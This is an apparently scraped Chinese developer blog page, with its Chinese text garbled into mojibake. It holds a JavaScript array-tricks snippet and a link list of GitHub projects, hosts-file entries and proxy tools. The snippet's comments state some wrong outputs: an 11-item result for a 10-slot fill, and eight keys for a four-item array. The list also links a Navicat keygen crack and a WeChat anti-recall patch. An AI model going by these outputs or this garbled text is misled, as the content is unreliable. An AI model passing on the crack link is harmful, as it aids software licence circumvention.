class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fruits = [â€œbananaâ€, â€œappleâ€, â€œorangeâ€, â€œwatermelonâ€, â€œappleâ€, â€œorangeâ€, â€œgrapeâ€, â€œappleâ€];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¬¬ä¸€ç§æ–¹æ³•</span></span><br><span class="line"><span class="keyword">var</span> uniqueFruits = <span class="built_in">Array</span>.from(<span class="keyword">new</span> <span class="built_in">Set</span>(fruits));</span><br><span class="line"><span class="built_in">console</span>.log(uniqueFruits); <span class="comment">// returns [â€œbananaâ€, â€œappleâ€, â€œorangeâ€, â€œwatermelonâ€, â€œgrapeâ€]</span></span><br><span class="line"><span class="comment">// ç¬¬äºŒç§æ–¹æ³•</span></span><br><span class="line"><span class="keyword">var</span> uniqueFruits2 = [â€¦<span class="keyword">new</span> <span class="built_in">Set</span>(fruits)];</span><br><span class="line"><span class="built_in">console</span>.log(uniqueFruits2); <span class="comment">// returns [â€œbananaâ€, â€œappleâ€, â€œorangeâ€, â€œwatermelonâ€, â€œgrapeâ€]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> friends = [</span><br><span class="line">    &#123; <span class="attr">name</span>: â€˜Johnâ€™, <span class="attr">age</span>: <span class="number">22</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">name</span>: â€˜Peterâ€™, <span class="attr">age</span>: <span class="number">23</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">name</span>: â€˜Markâ€™, <span class="attr">age</span>: <span class="number">24</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">name</span>: â€˜Mariaâ€™, <span class="attr">age</span>: <span class="number">22</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">name</span>: â€˜Monicaâ€™, <span class="attr">age</span>: <span class="number">21</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">name</span>: â€˜Marthaâ€™, <span class="attr">age</span>: <span class="number">19</span> &#125;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> friendsNames = <span class="built_in">Array</span>.from(friends, (&#123;name&#125;) =&gt; name);</span><br><span class="line"><span class="built_in">console</span>.log(friendsNames); <span class="comment">// returns [â€œJohnâ€, â€œPeterâ€, â€œMarkâ€, â€œMariaâ€, â€œMonicaâ€, â€œMarthaâ€]</span></span><br><span class="line">fruits.length = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> newArray = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">10</span>).fill(â€œ<span class="number">1</span>â€);</span><br><span class="line"><span class="built_in">console</span>.log(newArray); <span class="comment">// returns [â€œ1â€, â€œ1â€, â€œ1â€, â€œ1â€, â€œ1â€, â€œ1â€, â€œ1â€, â€œ1â€, â€œ1â€, â€œ1â€, â€œ1â€]</span></span><br><span class="line"><span class="keyword">var</span> fruits = [â€œappleâ€, â€œbananaâ€, â€œorangeâ€];</span><br><span class="line"><span class="keyword">var</span> meat = [â€œpoultryâ€, â€œbeefâ€, â€œfishâ€];</span><br><span class="line"><span class="keyword">var</span> vegetables = [â€œpotatoâ€, â€œtomatoâ€, â€œcucumberâ€];</span><br><span class="line"><span class="keyword">var</span> food = [â€¦fruits, â€¦meat, â€¦vegetables];</span><br><span class="line"><span class="built_in">console</span>.log(food); <span class="comment">// [â€œappleâ€, â€œbananaâ€, â€œorangeâ€, â€œpoultryâ€, â€œbeefâ€, â€œfishâ€, â€œpotatoâ€, â€œtomatoâ€, â€œcucumberâ€]</span></span><br><span class="line"><span class="keyword">var</span> mixedArr = [<span class="number">0</span>, â€œblueâ€, â€œâ€, <span class="literal">NaN</span>, <span class="number">9</span>, <span class="literal">true</span>, <span class="literal">undefined</span>, â€œwhiteâ€, <span class="literal">false</span>];</span><br><span class="line"><span class="keyword">var</span> trueArr = mixedArr.filter(<span class="built_in">Boolean</span>);</span><br><span class="line"><span class="built_in">console</span>.log(trueArr); <span class="comment">// returns [â€œblueâ€, 9, true, â€œwhiteâ€]</span></span><br><span class="line">éšæœº</span><br><span class="line"><span class="keyword">var</span> colors = [â€œblueâ€, â€œwhiteâ€, â€œgreenâ€, â€œnavyâ€, â€œpinkâ€, â€œpurpleâ€, â€œorangeâ€, â€œyellowâ€, â€œblackâ€, â€œbrownâ€];</span><br><span class="line"><span class="keyword">var</span> randomColor = colors[(<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * (colors.length)))]</span><br><span class="line"><span class="keyword">var</span> nums = [<span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">6</span>];</span><br><span class="line"><span class="keyword">var</span> sum = nums.reduce(<span class="function">(<span class="params">x, y</span>) =&gt;</span> x + y);</span><br><span class="line"><span class="built_in">console</span>.log(sum); <span class="comment">// returns 14</span></span><br><span class="line">https:<span class="comment">//learnku.com/f2e/t/38978</span></span><br><span class="line">ä¸ªæ•°ç»„çš„äº¤é›†</span><br><span class="line"><span class="keyword">var</span> numOne = [<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">8</span>];</span><br><span class="line"><span class="keyword">var</span> numTwo = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>];</span><br><span class="line"><span class="keyword">var</span> duplicatedValues = [â€¦<span class="keyword">new</span> <span class="built_in">Set</span>(numOne)].filter(<span class="function"><span class="params">item</span> =&gt;</span> numTwo.includes(item));</span><br><span class="line"><span class="built_in">console</span>.log(duplicatedValues); <span class="comment">// returns [2, 4, 6]</span></span><br><span class="line">æ•°ç»„è½¬å¯¹è±¡</span><br><span class="line"><span class="keyword">var</span> fruits = [â€œbananaâ€, â€œappleâ€, â€œorangeâ€, â€œwatermelonâ€];</span><br><span class="line"><span class="keyword">var</span> fruitsObj = &#123; â€¦fruits &#125;;</span><br><span class="line"><span class="built_in">console</span>.log(fruitsObj); <span class="comment">// returns &#123;0: â€œbananaâ€, 1: â€œappleâ€, 2: â€œorangeâ€, 3: â€œwatermelonâ€, 4: â€œappleâ€, 5: â€œorangeâ€, 6: â€œgrapeâ€, 7: â€œappleâ€&#125;</span></span><br></pre></td></tr></table></figure>
<p><a href="https://learnku.com/f2e/t/39272" target="_blank" rel="noopener">JavaScript ä¸­æ­£åˆ™è¡¨è¾¾å¼</a></p>
<p><a href="https://justadudewhohacks.github.io/face-api.js/" target="_blank" rel="noopener">æµè§ˆå™¨ä¸­åšäººè„¸è¯†åˆ«</a></p>
<p><a href="https://bestofjs.org/" target="_blank" rel="noopener">https://bestofjs.org/</a></p>
<p><a href="https://github.com/MasterShu/JavaScript-DataStructures-Algorithms" target="_blank" rel="noopener"> åˆ©ç”¨ JavaScript æ¥å­¦æ•°æ®ç»“æ„å’Œç®—æ³•ç®—æ³•</a></p>
<p>ç®€å•ç›´æ¥çš„ Javascript å¼€å‘ç¯å¢ƒ <a href="http://lixiaolai.com/2016/07/31/makecs-simplest-js-dev-environment/" target="_blank" rel="noopener">http://lixiaolai.com/2016/07/31/makecs-simplest-js-dev-environment/</a></p>
<p>å‰åç«¯éƒ½å¼€æºçš„h5å¿«é€Ÿåˆ¶ä½œå¹³å°ï¼Œç±»ä¼¼äºå¼€æºç‰ˆæœ¬çš„æ˜“ä¼ç§€ã€äººäººç§€ï¼Œå¯ä»¥é€šè¿‡æ‹–æ‹½çš„å½¢å¼ï¼Œå¿«é€Ÿç”ŸæˆH5ï¼Œå‰ç«¯å’Œåç«¯éƒ½å·²ç»å¼€æºäº†ï¼Œè€Œä¸”åœ¨æŒç»­è¿­ä»£ä¸­ <a href="https://github.com/ly525/luban-h5" target="_blank" rel="noopener">https://github.com/ly525/luban-h5</a></p>
<p> alert xss <a href="https://alf.nu/alert1" target="_blank" rel="noopener">https://alf.nu/alert1</a></p>
<p><a href="https://github.com/fising/big-file-uploader" target="_blank" rel="noopener">é€šè¿‡æ–‡ä»¶åˆ†ç‰‡è§£å†³å¤§æ–‡ä»¶ä¸Šä¼ </a></p>
<p><a href="https://learnku.com/articles/31533" target="_blank" rel="noopener">JS æ•°æ®ç»“æ„</a></p>
<p><a href="https://coolshell.cn/articles/17634.html" target="_blank" rel="noopener">CHROMEå¼€å‘è€…å·¥å…·çš„å°æŠ€å·§</a></p>
<p><a href="https://juejin.im/post/5af53823f265da0b75282b0f#heading-11" target="_blank" rel="noopener">chromeå¼€å‘è€…å·¥å…·å„ç§éªšæŠ€å·§</a></p>
<p><a href="https://neuqzxy.github.io/2017/11/16/webpack%E7%AC%94%E8%AE%B0-%E6%9C%8D%E5%8A%A1%E5%8F%8A%E7%83%AD%E6%9B%B4%E6%96%B0/" target="_blank" rel="noopener">webpackç¬”è®°-æœåŠ¡åŠçƒ­æ›´æ–°</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/28937831" target="_blank" rel="noopener">JavaScriptç¼–ç¨‹é»‘ç§‘æŠ€</a></p>
<p><a href="https://learnku.com/docs/writing-docs/typography/3957" target="_blank" rel="noopener">ä¸­æ–‡æ–‡æ¡ˆæ’ç‰ˆè§„èŒƒ</a></p>
<p><a href="https://github.com/pushmetop/30-seconds-for-everyday" target="_blank" rel="noopener">å‰ç«¯æ¯æ—¥ 30 ç§’</a></p>
<p><a href="https://zhangslob.github.io/2018/12/21/Chrome%E6%96%AD%E7%82%B9JS%E5%AF%BB%E6%89%BE%E6%B7%98%E5%AE%9D%E7%AD%BE%E5%90%8Dsign/" target="_blank" rel="noopener">Chromeæ–­ç‚¹JSå¯»æ‰¾æ·˜å®ç­¾åsign</a></p>
<p><a href="https://recordrtc.org/" target="_blank" rel="noopener">HTML å®ç°é‡‡é›†æ‹ç…§åŠŸèƒ½</a></p>
<p><a href="http://nullpointer.pw/%E5%BE%AE%E4%BF%A1%E5%88%86%E4%BA%AB%E8%B8%A9%E5%9D%91%E4%B9%8B%E6%97%85.html" target="_blank" rel="noopener">å¾®ä¿¡åˆ†äº«è¸©å‘ä¹‹æ—…</a></p>
<p><a href="http://cuihuan.net/2019/05/12/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/" target="_blank" rel="noopener">å­—ç¬¦ç¼–ç é‚£äº›äº‹å„¿</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/13/github-ç²¾é€‰é¡¹ç›®æ”¶é›†/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="è‹ç”Ÿä¸æƒ‘">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="è‹ç”Ÿä¸æƒ‘çš„åšå®¢">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/05/13/github-ç²¾é€‰é¡¹ç›®æ”¶é›†/" itemprop="url">github ç²¾é€‰é¡¹ç›®æ”¶é›†</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-05-13T11:30:29+08:00">
                2019-05-13
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  1.1k å­—
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  4 åˆ†é’Ÿ
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="githubä»£ç cloneåŠ é€Ÿ"><a href="#githubä»£ç cloneåŠ é€Ÿ" class="headerlink" title="githubä»£ç cloneåŠ é€Ÿ"></a>githubä»£ç cloneåŠ é€Ÿ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">githubä»£ç cloneåŠ é€Ÿï¼Œhostsæ¯æ—¥ç”Ÿæˆæ›´æ–° http:<span class="comment">//nullpointer.pw </span></span><br><span class="line">https:<span class="comment">//github.com/Mosiki/github</span></span><br><span class="line"></span><br><span class="line">æœ€ç®€å•çš„æ–¹å¼å°±æ˜¯ä¸‹è½½ Switch Host https:<span class="comment">//oldj.github.io/SwitchHosts/è½¯ä»¶è¿›è¡Œ host ä¿®æ”¹ï¼Œè·¨å¹³å°ï¼Œå› ä¸º hosts æ–‡ä»¶æ¯æ—¥éƒ½ä¼šè‡ªåŠ¨æ›´æ–°ï¼Œæ‰€ä»¥éœ€è¦æœ¬åœ°çš„ hosts ä¹Ÿèƒ½è‡ªåŠ¨æ›´æ–°ï¼Œ å¥½åœ¨ SwitchHosts æä¾›äº†è¿œç¨‹ hosts çš„åŠŸèƒ½ã€‚</span></span><br><span class="line"></span><br><span class="line">å¤åˆ¶å¦‚ä¸‹ hosts åœ°å€</span><br><span class="line"> </span><br><span class="line">https:<span class="comment">//raw.githubusercontent.com/Mosiki/github/master/github_hosts.txt</span></span><br><span class="line"></span><br><span class="line"><span class="number">52.74</span><span class="number">.223</span><span class="number">.119</span> github.com</span><br><span class="line"><span class="number">59.24</span><span class="number">.3</span><span class="number">.173</span> gist.github.com</span><br><span class="line"><span class="number">185.199</span><span class="number">.108</span><span class="number">.153</span> assets-cdn.github.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.108</span><span class="number">.133</span> raw.githubusercontent.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.108</span><span class="number">.133</span> gist.githubusercontent.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.108</span><span class="number">.133</span> cloud.githubusercontent.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.228</span><span class="number">.133</span> camo.githubusercontent.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.108</span><span class="number">.133</span> avatars0.githubusercontent.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.108</span><span class="number">.133</span> avatars1.githubusercontent.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.228</span><span class="number">.133</span> avatars2.githubusercontent.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.228</span><span class="number">.133</span> avatars3.githubusercontent.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.108</span><span class="number">.133</span> avatars4.githubusercontent.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.108</span><span class="number">.133</span> avatars5.githubusercontent.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.108</span><span class="number">.133</span> avatars6.githubusercontent.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.108</span><span class="number">.133</span> avatars7.githubusercontent.com</span><br><span class="line"><span class="number">151.101</span><span class="number">.108</span><span class="number">.133</span> avatars8.githubusercontent.com</span><br><span class="line"><span class="number">185.199</span><span class="number">.109</span><span class="number">.154</span> github.githubassets.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è®¾ç½®è‡ªåŠ¨æ›´æ–°</span><br><span class="line">é€‰æ‹© <span class="number">24</span> å°æ—¶å³å¯ï¼Œç¬¬ä¸€æ¬¡æ·»åŠ çš„æ—¶å€™éœ€è¦æ‰‹åŠ¨ç‚¹å‡»åˆ·æ–°æŒ‰é’®ï¼Œåˆ·æ–°è·å–ä¸€ä¸‹è¿œç¨‹çš„ hosts</span><br><span class="line">http:<span class="comment">//nullpointer.pw/github%E4%BB%A3%E7%A0%81clone%E5%8A%A0%E9%80%9F.html</span></span><br><span class="line">https:<span class="comment">//www.codeku.me/archives/3031.html</span></span><br><span class="line">githubé•œåƒåœ°å€ï¼šhttps:<span class="comment">//i.codeku.me æ›¿æ¢ github.com</span></span><br><span class="line">ä¸‹è½½é•œåƒï¼šhttps:<span class="comment">//ws.codeku.me æ›¿æ¢ codeload.github.com</span></span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/xianyucoder/Crack-JS" target="_blank" rel="noopener">Python3çˆ¬è™«é¡¹ç›®è¿›é˜¶å®æˆ˜ã€JSåŠ è§£å¯†</a></p>
<p>å®šæŠ•æ”¹å˜å‘½è¿ â€”â€” è®©æ—¶é—´é™ªä½ æ…¢æ…¢å˜å¯Œ <a href="https://github.com/xiaolai/regular-investing-in-box" target="_blank" rel="noopener">https://github.com/xiaolai/regular-investing-in-box</a></p>
<p>èš‚èšæ£®æ—èƒ½é‡æ™ºèƒ½æ”¶å–è„šæœ¬ (åŸºäºAuto.js)<a href="https://github.com/SuperMonster003/Auto.js_Projects/tree/Ant_Forest" target="_blank" rel="noopener">https://github.com/SuperMonster003/Auto.js_Projects/tree/Ant_Forest</a></p>
<p>æ–‡ç« å¤šå¹³å°å‘å¸ƒå·¥å…·:AutoPublishï¼Œç›®å‰æ”¯æŒçŸ¥ä¹ã€CSDNã€è±†ç“£æ—¥å¿— <a href="https://github.com/ayuliao/Autopublish" target="_blank" rel="noopener">https://github.com/ayuliao/Autopublish</a></p>
<p> <a href="https://github.com/zzjzz9266a/91porn_php" target="_blank" rel="noopener">91pornçˆ¬è™«phpç‰ˆæœ¬</a></p>
<p><a href="https://github.com/arnofeng/ngx_google_deployment" target="_blank" rel="noopener"> ä¸€é”®åä»£è°·æ­Œå’Œè°·æ­Œå­¦æœ¯</a></p>
<p><a href="https://github.com/Michael728/awesome-tools-resources" target="_blank" rel="noopener">åˆ†äº«å‘ç°çš„å¥½èµ„æºï¼Œå¥½å·¥å…·</a></p>
<p><a href="https://github.com/ofcold/desktop-pictures" target="_blank" rel="noopener">æ¡Œé¢å£çº¸åˆ†äº«</a></p>
<p><a href="https://github.com/jaywcjlove/handbook" target="_blank" rel="noopener">ç¬”è®°/æœé›†/æ‘˜å½•/å®è·µ</a></p>
<p><a href="https://github.com/selfteaching/the-craft-of-selfteaching" target="_blank" rel="noopener">æç¬‘æ¥çš„æ–°ä¹¦ã€Šè‡ªå­¦æ˜¯é—¨æ‰‹è‰ºã€‹å‘å¸ƒäº†</a></p>
<p><a href="https://github.com/jinfagang/tensorflow_poems" target="_blank" rel="noopener">ä¸­æ–‡å¤è¯—è‡ªåŠ¨ä½œè¯—æœºå™¨äºº</a></p>
<p><a href="https://github.com/lawvs/buddy-github-events" target="_blank" rel="noopener">å·çœ‹å¤§ä½¬ä»¬çš„ GitHub åŠ¨æ€</a></p>
<p><a href="https://github.com/0123cf/auto-layout" target="_blank" rel="noopener">å¼€æºå¯è§†åŒ–å¸ƒå±€é¡¹ç›®</a></p>
<p><a href="https://github.com/EtherDream/jsproxy/" target="_blank" rel="noopener">Googleä»£ç†</a></p>
<p><a href="https://zhaodao.ai/" target="_blank" rel="noopener">æ‰¾åˆ°ä½ å–œçˆ±çš„ä½œå“</a></p>
<p><a href="https://github.com/36huo/wechat_anti_revoke/" target="_blank" rel="noopener">å¾®ä¿¡ PC 2.6.8.37 é˜²æ’¤å›è¡¥ä¸</a></p>
<p><a href="https://unsplash.com/" target="_blank" rel="noopener">æ— ç‰ˆæƒå›¾ç‰‡</a></p>
<p><a href="https://github.com/vinta/pangu.js" target="_blank" rel="noopener">åŠ ç©ºæ ¼</a></p>
<p><a href="https://github.com/TIM168/technical_books" target="_blank" rel="noopener"> IT äº’è”ç½‘ä¹¦ç±</a></p>
<p><a href="https://github.com/ruanyf/simple-bash-scripts" target="_blank" rel="noopener">A collection of simple Bash scripts</a></p>
<p><a href="https://segmentfault.com/a/1190000019239788" target="_blank" rel="noopener">Pythonçˆ¬è™«ä¾‹å­ä¹‹QQå†å²æŠ¥å‘Š</a></p>
<p><a href="https://coding.net/u/lunayj/p/developer-pray-codeImg/git" target="_blank" rel="noopener">ç¨‹åºçŒ¿ä¸“ç”¨ä¿ä½‘ æ³¨é‡Šä»£ç  asciiå›¾åƒ</a></p>
<p><a href="https://github.com/CraryPrimitiveMan/awesome-php-zh_CN" target="_blank" rel="noopener">ä¸€ä¸ªPHPèµ„æºåˆ—è¡¨ï¼Œå†…å®¹åŒ…æ‹¬ï¼šåº“ã€æ¡†æ¶ã€æ¨¡æ¿ã€å®‰å…¨</a></p>
<p><a href="https://github.com/epety/100-shell-script-examples" target="_blank" rel="noopener">Collection of shell scripts found on the internet</a></p>
<p><a href="https://github.com/jaywcjlove/github-rank" target="_blank" rel="noopener">sf GitHub å¼€å‘è€…çƒ­é—¨ https://wangchujiang.com/github-rank/sifou-daily.html</a></p>
<p><a href="https://github.com/nick233333/phper-linux-gitbook" target="_blank" rel="noopener">PHPer å¿…çŸ¥å¿…ä¼šçš„ Linux å‘½ä»¤ https://linux.hellocode.name/</a></p>
<p><a href="https://github.com/sqc157400661/XiaoTShop" target="_blank" rel="noopener">laravel5.5æ­å»ºçš„åå°ç®¡ç† å’Œ apiæœåŠ¡ çš„å°ç¨‹åºå•†åŸ</a></p>
<p><a href="https://github.com/rrweb-io" target="_blank" rel="noopener">å½•åˆ¶å¹¶å›æ”¾ä»»æ„ web ç•Œé¢ä¸­çš„ç”¨æˆ·æ“ä½œ</a></p>
<p><a href="https://github.com/2016rshah/githubchart-api" target="_blank" rel="noopener">Githubè´¡çŒ®å›¾è¡¨ä½œä¸ºå›¾åƒ</a></p>
<p><a href="https://github.com/ecmadao/hacknical" target="_blank" rel="noopener">å¯è§†åŒ– GitHub ç®€å†</a></p>
<p><a href="https://www.codeku.me/archives/3031.html" target="_blank" rel="noopener">åå‘ä»£ç† GitHubgreasyfork.org/zh-CN/scripts/383577</a></p>
<p><a href="https://github.com/ccxt/ccxt" target="_blank" rel="noopener">æ•°å­—è´§å¸äº¤æ˜“api https://learnku.com/articles/28049#replies</a></p>
<p><a href="https://github.com/aoxiang594/laravel-province-city-area" target="_blank" rel="noopener">çœå¸‚åŒºå¿ä¹¡é•‡è¡—é“ è‡ªå¸¦çˆ¬è™«</a></p>
<p><a href="https://github.com/byrwiki/byrwiki/issues/13" target="_blank" rel="noopener">ç§‘å­¦ä¸Šç½‘åŠæ³•ç§‘æ™®</a></p>
<p><a href="https://github.com/wi1dcard/china-divisions" target="_blank" rel="noopener">ä¸­å›½è¡Œæ”¿åŒºåˆ’åœ°å€åº“</a></p>
<p><a href="https://github.com/mylxsw/growing-up" target="_blank" rel="noopener">ç¨‹åºçŒ¿æˆé•¿è®¡åˆ’</a></p>
<p><a href="https://github.com/phobal/ivideo" target="_blank" rel="noopener">è§‚çœ‹å›½å†…ä¸»æµè§†é¢‘å¹³å°æ‰€æœ‰è§†é¢‘çš„å®¢æˆ·ç«¯</a></p>
<p><a href="https://github.com/guanguans/soar-php" target="_blank" rel="noopener">SQL è¯­å¥ä¼˜åŒ–å™¨å’Œé‡å†™å™¨</a></p>
<p><a href="https://github.com/52cik/github-hans" target="_blank" rel="noopener">GitHub æ±‰åŒ–æ’ä»¶</a></p>
<p><a href="https://github.com/Deltafox79/Navicat_Keygen" target="_blank" rel="noopener">Navicat_Keygenç ´è§£</a></p>
<p><a href="https://github.com/zzjzz9266a/91porn_php" target="_blank" rel="noopener">91pornçˆ¬è™«phpç‰ˆæœ¬</a></p>
<p><a href="https://github.com/henrylee2cn/pholcus_lib" target="_blank" rel="noopener">å…¬å…±ç»´æŠ¤çš„Pholcusçˆ¬è™«è§„åˆ™åº“</a></p>
<p><a href="https://github.com/nondanee/UnblockNeteaseMusic" target="_blank" rel="noopener">è§£é”ç½‘æ˜“äº‘éŸ³ä¹å®¢æˆ·ç«¯å˜ç°æ­Œæ›²</a></p>
<p><a href="https://github.com/hacklcx/HFish" target="_blank" rel="noopener">ä¼ä¸šå®‰å…¨æµ‹è¯•ä¸»åŠ¨æ”»å‡»å‹èœœç½é’“é±¼æ¡†æ¶ç³»ç»Ÿ</a></p>
<p>çˆ±å›½å®ˆæ³•ï¼Œç§‘å­¦ä¸Šç½‘google <a href="https://github.com/zhouaini528/scientific_internet_access" target="_blank" rel="noopener">https://github.com/zhouaini528/scientific_internet_access</a></p>
<p> å†…éƒ¨APIçš„å®‰å…¨é˜²æŠ¤æ€ä¹ˆæï¼Ÿå¯†ç å­¦ä¸­æœ‰ç­”æ¡ˆ <a href="https://ksloveyuan.github.io/posts/api_security/" target="_blank" rel="noopener">https://ksloveyuan.github.io/posts/api_security/</a></p>
<p>æ–‡ç« å¤šå¹³å°å‘å¸ƒå·¥å…·:AutoPublishï¼Œç›®å‰æ”¯æŒçŸ¥ä¹ã€CSDNã€è±†ç“£æ—¥å¿— <a href="https://github.com/ayuliao/Autopublish" target="_blank" rel="noopener">https://github.com/ayuliao/Autopublish</a></p>
<p>èš‚èšæ£®æ—èƒ½é‡æ™ºèƒ½æ”¶å–è„šæœ¬ (åŸºäºAuto.js)<a href="https://github.com/SuperMonster003/Auto.js_Projects/tree/Ant_Forest" target="_blank" rel="noopener">https://github.com/SuperMonster003/Auto.js_Projects/tree/Ant_Forest</a></p>
<p>POLAR æ˜¯ä¸€ä¸ªå¼ºå¤§çš„è·¨å¹³å°ï¼ˆMacã€Windowã€Linuxï¼‰æ–‡æ¡£ç®¡ç†ç³»ç»Ÿï¼Œå®ƒèƒ½å¤Ÿç¦»çº¿ç¼“å­˜ç½‘é¡µå†…å®¹ã€PDF ç”µå­ä¹¦å’Œç¬”è®°ã€‚æ”¯æŒæ ‡ç­¾ç®¡ç†ã€æ·»åŠ æ³¨è§£ã€é«˜äº®å†…å®¹ï¼ˆç½‘é¡µã€PDFï¼‰ï¼Œè®°å½•é˜…è¯»è¿›åº¦ã€‚<a href="https://github.com/burtonator/polar-bookshelf" target="_blank" rel="noopener">https://github.com/burtonator/polar-bookshelf</a></p>
<p>å¦‚ä½•æ­å»ºv2rayï¼Œæ”¾å¼ƒä½¿ç”¨sså’Œssr <a href="https://viencoding.com/article/207" target="_blank" rel="noopener">https://viencoding.com/article/207</a></p>
<p>ä½ åœ¨ GitHub ä¸Šçœ‹åˆ°è¿‡çš„æœ€æœ‰æ„æ€çš„é¡¹ç›®æ˜¯ä»€ä¹ˆ <a href="https://www.zhihu.com/question/23498424/answer/353063346" target="_blank" rel="noopener">https://www.zhihu.com/question/23498424/answer/353063346</a></p>
<p> ã€Šç§‘å­¦ä¸Šç½‘ç¿»å¢™æ•™ç¨‹ã€‹é˜…è¯»åœ°å€ï¼š<a href="https://darrenliuwei.coding.me/fuck-gfw" target="_blank" rel="noopener">https://darrenliuwei.coding.me/fuck-gfw</a> <a href="https://github.com/fanqiangdang/fuck-gfw" target="_blank" rel="noopener">https://github.com/fanqiangdang/fuck-gfw</a></p>
<p>å¤‡ä»½å¾®ä¿¡ã€å¾®åšç­‰å¹³å°è¢«åˆ æ–‡ç«  <a href="https://github.com/Terminus2049/Terminus2049.github.io" target="_blank" rel="noopener">https://github.com/Terminus2049/Terminus2049.github.io</a></p>
<p>çˆ±å›½å®ˆæ³•ï¼Œç§‘å­¦ä¸Šç½‘google <a href="https://github.com/zhouaini528/scientific_internet_access" target="_blank" rel="noopener">https://github.com/zhouaini528/scientific_internet_access</a></p>
<p>å®Œç¾é‡ç°ä¹ç¥ã€Šå›¤æ¯”ç‰¹å¸ï¼šå¯»æ‰¾åˆé€‚çš„å¤Ÿä¹°æ—¶æœºã€‹ <a href="https://github.com/Ksloveyuan/btc_price_analyzer" target="_blank" rel="noopener">https://github.com/Ksloveyuan/btc_price_analyzer</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/13/php-è®°å½•/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="è‹ç”Ÿä¸æƒ‘">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="è‹ç”Ÿä¸æƒ‘çš„åšå®¢">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
